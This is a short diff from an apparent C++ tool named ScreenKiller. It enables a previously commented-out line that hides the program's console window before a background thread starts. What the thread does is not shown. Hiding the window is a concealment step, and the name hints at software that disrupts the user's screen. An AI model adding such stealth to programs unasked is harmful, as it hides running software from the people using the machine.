@@ -18,7 +18,7 @@ void ScreenKiller::deploy()
 {
 	this->m_alive = true;
 
-	//ShowWindow(GetConsoleWindow(), SW_HIDE);
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
 
 	this->runner_thread = std::thread([this] {this->deploy_inner(); });
 }
